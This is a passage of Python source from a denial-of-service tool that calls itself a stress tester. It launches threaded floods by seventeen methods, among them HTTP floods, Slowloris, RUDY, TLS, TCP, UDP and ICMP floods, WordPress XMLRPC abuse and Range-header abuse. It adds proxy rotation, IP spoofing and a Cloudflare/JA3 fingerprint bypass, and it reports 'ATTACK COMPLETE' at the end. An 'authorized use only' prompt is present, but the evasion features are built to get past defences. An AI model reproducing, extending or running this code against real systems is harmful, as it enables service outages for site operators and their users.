        base_lat = _calibrate_resonance(url, use_proxy)
        # Dormir 40% du temps de réponse entre les vagues
        pulsar_sleep   = [max(0.05, base_lat * 0.40)]
        pulsar_barrier = threading.Barrier(workers, timeout=6)
        ok(f"PULSAR calibrated — burst every [{G1}]{pulsar_sleep[0]*1000:.0f}ms[/]  "
           f"workers [{G1}]{workers}[/]  burst_rate=[{G1}]{workers / (base_lat + pulsar_sleep[0]):.1f}[/] req/s")
        if use_cffi:
            ok(f"Cloudflare bypass: [{G1}]ACTIVE[/] (curl_cffi Chrome TLS fingerprint)")
        console.print()

    threads = []
    for _ in range(workers):
        if   method == "HTTP_GET":     t = threading.Thread(target=_worker_http_get,    args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_POST":    t = threading.Thread(target=_worker_http_post,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_HEAD":    t = threading.Thread(target=_worker_http_head,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_BYPASS":  t = threading.Thread(target=_worker_http_bypass, args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_JSON":    t = threading.Thread(target=_worker_http_json,   args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_COOKIE":  t = threading.Thread(target=_worker_http_cookie, args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_XMLRPC":  t = threading.Thread(target=_worker_xmlrpc,      args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_RANGE":   t = threading.Thread(target=_worker_http_range,  args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "HTTP_MIXED":   t = threading.Thread(target=_worker_http_mixed,  args=(url, stats, use_proxy, UA_LIST), daemon=True)
        elif method == "RESONANCE":    t = threading.Thread(target=_worker_resonance,   args=(url, stats, use_proxy, UA_LIST, resonance_timer), daemon=True)
        elif method == "PULSAR":       t = threading.Thread(target=_worker_pulsar,      args=(url, stats, use_proxy, UA_LIST, pulsar_barrier, pulsar_sleep, use_cffi), daemon=True)
        elif method == "SLOWLORIS":    t = threading.Thread(target=_worker_slowloris,   args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "RUDY":         t = threading.Thread(target=_worker_rudy,        args=(host, port, parsed_path, stats, use_proxy), daemon=True)
        elif method == "TLS":          t = threading.Thread(target=_worker_tls,         args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "TCP":          t = threading.Thread(target=_worker_tcp,         args=(host, port, stats, use_proxy),  daemon=True)
        elif method == "UDP":          t = threading.Thread(target=_worker_udp,         args=(host, port, stats),             daemon=True)
        elif method == "ICMP":         t = threading.Thread(target=_worker_icmp,        args=(host, stats),                   daemon=True)
        else:                          continue
        t.start()
        threads.append(t)

    cffi_note = f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""
    proxy_note = f"  proxy=[{G1}]ON (SOCKS)[/]" if use_proxy and method in SOCKET_METHODS \
            else f"  proxy=[{G1}]ON[/]"          if use_proxy \
            else f"  proxy=[{DM}]OFF[/]"
    info(f"[{G1}]{len(threads)}[/] workers — method [{OR}]{method}[/]{proxy_note}{cffi_note} — {duration}s")
    console.print()

    end_time = time.time() + duration
    try:
        with Live(console=console, refresh_per_second=4) as live:
            while time.time() < end_time and not _STOP.is_set():
                remaining = max(0, end_time - time.time())
                tbl = stats.render_table(target, method, True)
                subtitle = None
                if resonance_timer:
                    eff = workers / max(resonance_timer.interval, 0.001)
                    subtitle = (f"[{CY}]interval=[{G1}]{resonance_timer.interval*1000:.1f}ms[/]  "
                                f"adaptations=[{G1}]{resonance_timer.generation}[/]  "
                                f"eff=[{G1}]{eff:.1f} req/s[/]")
                elif pulsar_sleep is not None:
                    waves = int(stats.elapsed / max(pulsar_sleep[0], 0.01))
                    subtitle = (f"[{CY}]wave_interval=[{G1}]{pulsar_sleep[0]*1000:.0f}ms[/]  "
                                f"waves=[{G1}]{waves}[/]  "
                                f"workers/wave=[{G1}]{workers}[/]"
                                + (f"  [{G1}]CF-BYPASS ACTIVE[/]" if use_cffi else ""))
                if subtitle:
                    panel_content = Panel(tbl,
                        title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
                        subtitle=subtitle, border_style=RD)
                else:
                    panel_content = Panel(tbl,
                        title=f"[bold {RD}]◈ MEOW-STRESS :: {method} ◈  [{OR}]{remaining:.0f}s remaining[/]",
                        border_style=RD)
                live.update(panel_content)
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        _STOP.set()
        if pulsar_barrier:
            try: pulsar_barrier.abort()
            except Exception: pass

    console.print()
    console.print(Panel(
        stats.render_table(target, method, False),
        title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
        border_style=G2
    ))
    _save_results(target, method, stats, workers, duration)

def _save_results(target, method, stats: Stats, workers, duration):
    os.makedirs("data", exist_ok=True)
    fname = f"data/stress_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    import json
    data = {
        "target": target, "method": method,
        "workers": workers, "duration_s": duration,
        "total": stats.sent, "success": stats.ok, "failed": stats.fail,
        "rps": round(stats.rps, 2),
        "avg_latency_ms": round(stats.avg_ms, 2),
        "bytes_sent": stats.bytes_sent,
        "timestamp": datetime.now().isoformat()
    }
    with open(fname, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    ok(f"Results saved: [bold]{fname}[/]")

# ─── MAIN RUN ────────────────────────────────────────────────

METHODS = {
    # L7 HTTP
    "1":  ("HTTP_GET",    "L7  · HTTP GET flood       (web server, proxy rotation)"),
    "2":  ("HTTP_POST",   "L7  · HTTP POST flood      (forms / APIs, proxy rotation)"),
    "3":  ("HTTP_HEAD",   "L7  · HTTP HEAD flood      (lightweight, proxy rotation)"),
    "4":  ("HTTP_BYPASS", "L7  · Bypass mode          (CF/WAF + IP spoof + cache bust)"),
    "5":  ("HTTP_JSON",   "L7  · JSON POST flood      (REST APIs, proxy rotation)"),
    "6":  ("HTTP_COOKIE", "L7  · Cookie overflow      (session stores, proxy rotation)"),
    "7":  ("HTTP_XMLRPC", "L7  · XMLRPC multicall     (WordPress, proxy rotation)"),
    "8":  ("HTTP_RANGE",  "L7  · Range header abuse   (CVE-2011-3192 style, proxy rotation)"),
    "9":  ("HTTP_MIXED",  "L7  · Mixed methods        (random GET/POST/HEAD/BYPASS + proxy)"),
    # Méthodes UNIQUE
    "16": ("RESONANCE",  "L7  · RESONANCE            (Little's Law adaptive saturation — low BW, max load)"),
    "17": ("PULSAR",     "L7  · PULSAR [UNIQUE]      (vagues synchronisées Barrier — sature accept() OS, bypass CF)"),
    # L7 Socket
    "10": ("SLOWLORIS",   "L7  · Slowloris            (conn exhaustion, SOCKS proxy)"),
    "11": ("RUDY",        "L7  · R-U-Dead-Yet         (slow POST body, SOCKS proxy)"),
    "12": ("TLS",         "L7  · TLS handshake flood  (CPU-heavy on server, SOCKS proxy)"),
    # L4
    "13": ("TCP",         "L4  · TCP flood            (connection flood, SOCKS proxy)"),
    "14": ("UDP",         "L4  · UDP flood            (stateless packet flood)"),
    # L3
    "15": ("ICMP",        "L3  · ICMP flood           (ping flood / network layer)"),
}

def run():
    show_module_banner("stress")
    cat_talk(CAT_HACKER, "Stress testing engine loaded — 17 methods.", OR)
    console.print()

    warn("AUTHORIZED USE ONLY — Unauthorized stress testing is illegal.")
    warn("Use only on systems YOU OWN or have EXPLICIT WRITTEN PERMISSION to test.")
    console.print()
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    # Info curl_cffi
    if HAS_CFFI:
        ok(f"curl_cffi detected — Cloudflare/JA3 bypass [{G1}]AVAILABLE[/]")
    else:
        warn("curl_cffi not installed — Cloudflare bypass unavailable")
        warn(f"  Install: [{CY}]pip install curl_cffi[/]")
    console.print()

    while True:
        console.print(Rule(f"[{G1}] STRESS TEST — 17 METHODS ", style=G2))
        console.print(f"  [{DM}]── Application Layer L7 HTTP (proxy rotation) ──────────────[/]")
        for k in ("1","2","3","4","5","6","7","8","9"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── UNIQUE — Méthodes Avancées (+ bypass Cloudflare) ────────[/]")
        for k in ("16","17"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── Application Layer L7 Socket (SOCKS proxy) ───────────────[/]")
        for k in ("10","11","12"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{DM}]── Transport Layer (L4) / Network Layer (L3) ────────────────[/]")
        for k in ("13","14","15"):
            _, desc = METHODS[k]
            console.print(f"  [{G1}][{k:>2}][/] {desc}")
        console.print(f"  [{G1}][ 0][/] Back")
        console.print()
        choice = ask_choice("Method", "0")
        if choice == "0": break
        if choice not in METHODS:
            warn("Invalid choice"); continue

        method, _ = METHODS[choice]
        console.print()

        target = Prompt.ask(f"  [{G1}]◈ Target (IP / URL / domain)[/]").strip()
        if not target: continue

        default_workers = 50 if method in ("HTTP_GET","HTTP_POST","HTTP_JSON","TCP","PULSAR") else 20
        try:
            workers = IntPrompt.ask(f"  [{G1}]◈ Workers[/]", default=default_workers)
            workers = max(1, min(workers, 500))
        except Exception:
            workers = default_workers

        try:
            duration = IntPrompt.ask(f"  [{G1}]◈ Duration (seconds)[/]", default=30)
            duration = max(5, min(duration, 300))
        except Exception:
            duration = 30

        # Proxy + option CF bypass pour les méthodes HTTP
        use_proxy  = False
        use_cffi   = False

        if method not in ("UDP", "ICMP"):
            if method in ("TCP","SLOWLORIS","RUDY","TLS"):
                proxy_label = f"[{OR}]◈ Use proxy rotation? (SOCKS — requires PySocks)[/]"
            else:
                proxy_label = f"[{OR}]◈ Use proxy rotation? (HTTP/SOCKS)[/]"
            use_proxy = Confirm.ask(f"  {proxy_label}", default=False)

        # Option curl_cffi (bypass Cloudflare / JA3) pour les méthodes HTTP
        if method in ("HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS","HTTP_JSON",
                      "HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
                      "RESONANCE","PULSAR"):
            if HAS_CFFI:
                use_cffi = Confirm.ask(
                    f"  [{G1}]◈ Bypass Cloudflare/JA3? (curl_cffi Chrome fingerprint)[/]",
                    default=(method == "PULSAR")
                )
            else:
                info(f"[{DM}]curl_cffi not installed — no CF bypass. pip install curl_cffi[/]")

        if method == "RESONANCE":
            info("RESONANCE — recommended: 10-30 workers")
        if method == "PULSAR":
            info(f"PULSAR — recommended: [{G1}]50-100 workers[/], bursts synchronisés")
            info(f"stream=True → body abandonné — serveur bufferise tout pour rien")

        console.print()
        info(f"Target: [{CY}]{target}[/]  Method: [{OR}]{method}[/]  "
             f"Workers: [{G1}]{workers}[/]  Duration: [{G1}]{duration}s[/]"
             + (f"  [{G1}]CF-BYPASS[/]" if use_cffi else ""))
        console.print()

        _run_attack(target, method, workers, duration, use_proxy, use_cffi)
        console.print()
